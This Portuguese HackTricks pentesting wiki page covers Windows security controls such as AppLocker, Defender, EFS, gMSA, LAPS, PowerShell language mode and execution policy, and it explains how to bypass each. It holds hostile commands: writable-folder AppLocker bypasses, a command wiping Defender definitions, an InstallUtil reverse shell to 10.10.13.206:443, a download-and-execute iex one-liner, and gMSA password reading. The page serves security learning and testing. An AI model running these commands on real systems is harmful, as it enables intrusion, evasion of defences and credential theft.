# Controles de Segurança do Windows

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente, impulsionados pelas **ferramentas comunitárias mais avançadas** do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Política do AppLocker

Uma lista de permissões de aplicativos é uma lista de aplicativos de software ou executáveis aprovados que são permitidos estar presentes e serem executados em um sistema. O objetivo é proteger o ambiente de malware prejudicial e software não aprovado que não se alinha com as necessidades específicas de negócios de uma organização.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) é a **solução de lista de permissões de aplicativos** da Microsoft e dá aos administradores de sistema controle sobre **quais aplicativos e arquivos os usuários podem executar**. Ele fornece **controle granular** sobre executáveis, scripts, arquivos de instalação do Windows, DLLs, aplicativos empacotados e instaladores de aplicativos empacotados.\
É comum que as organizações **bloqueiem cmd.exe e PowerShell.exe** e o acesso de gravação a certos diretórios, **mas tudo isso pode ser contornado**.

### Verificação

Verifique quais arquivos/extensões estão na lista negra/lista branca:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Este caminho do registro contém as configurações e políticas aplicadas pelo AppLocker, fornecendo uma maneira de revisar o conjunto atual de regras aplicadas no sistema:

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

* **Pastas graváveis** úteis para contornar a política do AppLocker: Se o AppLocker estiver permitindo a execução de qualquer coisa dentro de `C:\Windows\System32` ou `C:\Windows`, há **pastas graváveis** que você pode usar para **contornar isso**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Binários **comumente confiáveis** [**"LOLBAS's"**](https://lolbas-project.github.io/) também podem ser úteis para contornar o AppLocker.
* **Regras mal escritas também podem ser contornadas**
* Por exemplo, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, você pode criar uma **pasta chamada `allowed`** em qualquer lugar e ela será permitida.
* As organizações também costumam se concentrar em **bloquear o executável `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, mas esquecem das **outras** [**localizações de executáveis do PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) como `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ou `PowerShell_ISE.exe`.
* **A imposição de DLL raramente é ativada** devido à carga adicional que pode colocar em um sistema e à quantidade de testes necessários para garantir que nada quebre. Portanto, usar **DLLs como backdoors ajudará a contornar o AppLocker**.
* Você pode usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **executar código Powershell** em qualquer processo e contornar o AppLocker. Para mais informações, consulte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Armazenamento de Credenciais

### Gerenciador de Contas de Segurança (SAM)

Credenciais locais estão presentes neste arquivo, as senhas são hashadas.

### Autoridade de Segurança Local (LSA) - LSASS

As **credenciais** (hashadas) são **salvas** na **memória** deste subsistema por razões de Single Sign-On.\
**LSA** administra a **política de segurança** local (política de senha, permissões de usuários...), **autenticação**, **tokens de acesso**...\
A LSA será a responsável por **verificar** as credenciais fornecidas dentro do arquivo **SAM** (para um login local) e **conversar** com o **controlador de domínio** para autenticar um usuário de domínio.

As **credenciais** são **salvas** dentro do **processo LSASS**: tickets Kerberos, hashes NT e LM, senhas facilmente descriptografadas.

### Segredos da LSA

A LSA pode salvar em disco algumas credenciais:

* Senha da conta do computador do Active Directory (controlador de domínio inacessível).
* Senhas das contas de serviços do Windows
* Senhas para tarefas agendadas
* Mais (senha de aplicativos IIS...)

### NTDS.dit

É o banco de dados do Active Directory. Está presente apenas em Controladores de Domínio.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) é um antivírus disponível no Windows 10 e Windows 11, e em versões do Windows Server. Ele **bloqueia** ferramentas comuns de pentesting como **`WinPEAS`**. No entanto, existem maneiras de **contornar essas proteções**.

### Verificação

Para verificar o **status** do **Defender**, você pode executar o cmdlet PS **`Get-MpComputerStatus`** (verifique o valor de **`RealTimeProtectionEnabled`** para saber se está ativo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Para enumerá-lo, você também pode executar:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS protege arquivos por meio de criptografia, utilizando uma **chave simétrica** conhecida como **File Encryption Key (FEK)**. Esta chave é criptografada com a **chave pública** do usuário e armazenada dentro do **fluxo de dados alternativo** $EFS do arquivo criptografado. Quando a descriptografia é necessária, a correspondente **chave privada** do certificado digital do usuário é usada para descriptografar a FEK do fluxo $EFS. Mais detalhes podem ser encontrados [aqui](https://en.wikipedia.org/wiki/Encrypting\_File\_System).

**Cenários de descriptografia sem a iniciação do usuário** incluem:

* Quando arquivos ou pastas são movidos para um sistema de arquivos não-EFS, como [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table), eles são automaticamente descriptografados.
* Arquivos criptografados enviados pela rede via protocolo SMB/CIFS são descriptografados antes da transmissão.

Este método de criptografia permite **acesso transparente** a arquivos criptografados para o proprietário. No entanto, simplesmente mudar a senha do proprietário e fazer login não permitirá a descriptografia.

**Principais Conclusões**:

* EFS usa uma FEK simétrica, criptografada com a chave pública do usuário.
* A descriptografia utiliza a chave privada do usuário para acessar a FEK.
* A descriptografia automática ocorre sob condições específicas, como copiar para FAT32 ou transmissão pela rede.
* Arquivos criptografados são acessíveis ao proprietário sem etapas adicionais.

### Verificar informações do EFS

Verifique se um **usuário** **usou** este **serviço** verificando se este caminho existe: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Verifique **quem** tem **acesso** ao arquivo usando cipher /c \<file>\
Você também pode usar `cipher /e` e `cipher /d` dentro de uma pasta para **criptografar** e **descriptografar** todos os arquivos

### Descriptografando arquivos EFS

#### Sendo Autoridade do Sistema

Esse método requer que o **usuário vítima** esteja **executando** um **processo** dentro do host. Se esse for o caso, usando sessões `meterpreter`, você pode assumir o token do processo do usuário (`impersonate_token` do `incognito`). Ou você poderia apenas `migrate` para o processo do usuário.

#### Conhecendo a senha dos usuários

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Group Managed Service Accounts (gMSA)

A Microsoft desenvolveu **Group Managed Service Accounts (gMSA)** para simplificar a gestão de contas de serviço em infraestruturas de TI. Ao contrário das contas de serviço tradicionais que frequentemente têm a configuração "**Senha nunca expira**" ativada, os gMSAs oferecem uma solução mais segura e gerenciável:

* **Gerenciamento Automático de Senhas**: gMSAs usam uma senha complexa de 240 caracteres que muda automaticamente de acordo com a política de domínio ou computador. Este processo é gerenciado pelo Serviço de Distribuição de Chaves (KDC) da Microsoft, eliminando a necessidade de atualizações manuais de senha.
* **Segurança Aprimorada**: Essas contas são imunes a bloqueios e não podem ser usadas para logins interativos, aumentando sua segurança.
* **Suporte a Múltiplos Hosts**: gMSAs podem ser compartilhadas entre vários hosts, tornando-as ideais para serviços que rodam em vários servidores.
* **Capacidade de Tarefas Agendadas**: Ao contrário das contas de serviço gerenciadas, gMSAs suportam a execução de tarefas agendadas.
* **Gerenciamento Simplificado de SPN**: O sistema atualiza automaticamente o Nome Principal do Serviço (SPN) quando há alterações nos detalhes do sAMaccount do computador ou no nome DNS, simplificando o gerenciamento de SPN.

As senhas para gMSAs são armazenadas na propriedade LDAP _**msDS-ManagedPassword**_ e são redefinidas automaticamente a cada 30 dias pelos Controladores de Domínio (DCs). Esta senha, um blob de dados criptografados conhecido como [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), só pode ser recuperada por administradores autorizados e pelos servidores nos quais os gMSAs estão instalados, garantindo um ambiente seguro. Para acessar essas informações, é necessária uma conexão segura, como LDAPS, ou a conexão deve ser autenticada com 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../.gitbook/assets/asd1.png)

Você pode ler esta senha com [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Encontre mais informações neste post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Além disso, verifique esta [página da web](https://cube0x0.github.io/Relaying-for-gMSA/) sobre como realizar um **ataque de retransmissão NTLM** para **ler** a **senha** do **gMSA**.

## LAPS

A **Solução de Senha do Administrador Local (LAPS)**, disponível para download no [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), permite a gestão de senhas de Administrador local. Essas senhas, que são **aleatórias**, únicas e **regularmente alteradas**, são armazenadas centralmente no Active Directory. O acesso a essas senhas é restrito através de ACLs a usuários autorizados. Com permissões suficientes concedidas, a capacidade de ler senhas de administrador local é fornecida.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

## Modo de Linguagem Constrangida do PowerShell

O PowerShell [**Modo de Linguagem Constrangida**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **limita muitas das funcionalidades** necessárias para usar o PowerShell de forma eficaz, como bloquear objetos COM, permitindo apenas tipos .NET aprovados, fluxos de trabalho baseados em XAML, classes do PowerShell e mais.

### **Verifique**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```powershell
#Easy bypass
Powershell -version 2
```
No Windows atual, esse Bypass não funcionará, mas você pode usar [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Para compilá-lo, você pode precisar** **de** _**Adicionar uma Referência**_ -> _Procurar_ -> _Procurar_ -> adicione `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` e **mude o projeto para .Net4.5**.

#### Bypass direto:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Shell reversa:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Você pode usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **executar código Powershell** em qualquer processo e contornar o modo restrito. Para mais informações, consulte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Política de Execução do PS

Por padrão, está definida como **restrita.** Principais maneiras de contornar essa política:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Mais pode ser encontrado [aqui](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Interface de Suporte de Segurança (SSPI)

É a API que pode ser usada para autenticar usuários.

O SSPI será responsável por encontrar o protocolo adequado para duas máquinas que desejam se comunicar. O método preferido para isso é o Kerberos. Em seguida, o SSPI negociará qual protocolo de autenticação será usado, esses protocolos de autenticação são chamados de Provedor de Suporte de Segurança (SSP), estão localizados dentro de cada máquina Windows na forma de uma DLL e ambas as máquinas devem suportar o mesmo para poderem se comunicar.

### Principais SSPs

* **Kerberos**: O preferido
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** e **NTLMv2**: Razões de compatibilidade
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Servidores web e LDAP, senha na forma de um hash MD5
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL e TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: É usado para negociar o protocolo a ser utilizado (Kerberos ou NTLM, sendo Kerberos o padrão)
* %windir%\Windows\System32\lsasrv.dll

#### A negociação pode oferecer vários métodos ou apenas um.

## UAC - Controle de Conta de Usuário

[Controle de Conta de Usuário (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) é um recurso que habilita um **prompt de consentimento para atividades elevadas**.

{% content-ref url="uac-user-account-control.md" %}
[uac-user-account-control.md](uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente, impulsionados pelas **ferramentas mais avançadas** da comunidade.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
